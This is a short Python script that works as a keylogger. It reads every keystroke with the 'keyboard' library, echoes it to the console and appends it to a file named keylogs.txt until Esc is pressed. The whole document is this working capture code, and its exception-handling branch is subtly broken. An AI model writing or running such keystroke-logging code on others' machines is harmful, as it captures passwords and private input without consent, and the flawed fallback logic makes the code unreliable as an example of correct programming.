import keyboard
import time

def main():
    with open("keylogs.txt", "a") as f:
        while True:
            event = keyboard.read_event()
            
            if event.name == 'esc': # If the key is Esc, stop the loop.
                break
            
            try:
                key_repr = str(event.name) # Try getting the representation of the key.
            except AttributeError: # If it's not a special key.
                key_repr = event.name.char 
            
            print("Key pressed:", key_repr) # Debug print statement.
            f.write(key_repr) # Write the representation to the file.
            f.flush() # Flush the buffer to ensure changes are written to disk.

if __name__ == "__main__":
    main()